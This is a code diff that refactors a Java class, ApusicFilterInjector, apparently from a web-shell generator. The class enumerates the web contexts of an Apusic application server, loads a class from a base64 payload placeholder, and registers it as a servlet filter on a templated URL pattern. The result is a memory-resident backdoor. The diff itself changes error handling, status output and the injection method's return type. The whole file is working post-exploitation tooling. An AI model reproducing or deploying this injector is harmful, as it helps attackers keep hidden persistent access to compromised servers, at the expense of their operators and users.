@@ -19,24 +19,7 @@ import java.util.zip.GZIPInputStream;
  */
 public class ApusicFilterInjector {
 
-    String msg = "";
-
-    public ApusicFilterInjector() {
-        try {
-            List<Object> contexts = getContext();
-            msg += "contexts size: " + contexts.size() + "\n";
-            for (Object context : contexts) {
-                Object shell = getShell(context);
-                boolean inject = inject(context, shell);
-                msg += "context: " + getFieldValue(context, "contextRoot") + (inject ? " ok" : " already") + "\n";
-            }
-        } catch (Throwable e) {
-            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-            PrintStream printStream = new PrintStream(outputStream);
-            e.printStackTrace(printStream);
-            msg += outputStream.toString();
-        }
-    }
+    private String msg = "";
 
     public String getUrlPattern() {
         return "{{urlPattern}}";
@@ -48,6 +31,45 @@ public class ApusicFilterInjector {
 
     public String getBase64String() throws IOException {
         return "{{base64Str}}";
+    }
+
+    public ApusicFilterInjector() {
+        List<Object> contexts = null;
+        try {
+            contexts = getContext();
+        } catch (Throwable throwable) {
+            msg += "context error: " + getErrorMessage(throwable);
+        }
+        if (contexts != null) {
+            for (Object context : contexts) {
+                msg += ("context: [" + getContextRoot(context) + "] ");
+                try {
+                    Object shell = getShell(context);
+                    inject(context, shell);
+                    msg += "[" + getUrlPattern() + "] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
+                }
+            }
+        }
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(context, "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
     }
 
     /**
@@ -92,7 +114,7 @@ public class ApusicFilterInjector {
             obj = loader.loadClass(getClassName()).newInstance();
             defineLoader = internalLoader;
         }
-        msg += defineLoader + " loaded \n";
+        msg += "[" + defineLoader.getClass().getName() + "] ";
         return obj;
     }
 
@@ -107,10 +129,10 @@ public class ApusicFilterInjector {
         }
     }
 
-    public boolean inject(Object context, Object filter) throws Exception {
+    public void inject(Object context, Object filter) throws Exception {
         Object webModule = getFieldValue(context, "webapp");
         if (invokeMethod(webModule, "getFilter", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
-            return false;
+            return;
         }
         // addFilterMapping
         Class<?> filterMappingClass = context.getClass().getClassLoader().loadClass("com.apusic.deploy.runtime.FilterMapping");
@@ -127,12 +149,11 @@ public class ApusicFilterInjector {
         Class<?> filterMappingArrayClass = Array.newInstance(filterMappingClass, 0).getClass();
         Object filterMapper = getFieldValue(context, "filterMapper");
         invokeMethod(filterMapper, "populate", new Class[]{filterMappingArrayClass}, new Object[]{allFilterMappings});
-        return true;
     }
 
     @Override
     public String toString() {
-        return super.toString() + "\n" + msg;
+        return msg;
     }
 
     @SuppressWarnings("all")
@@ -214,6 +235,21 @@ public class ApusicFilterInjector {
             return method.invoke(obj instanceof Class ? null : obj, param);
         } catch (Exception e) {
             throw new RuntimeException("Error invoking method: " + methodName, e);
+        }
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
         }
     }
 }
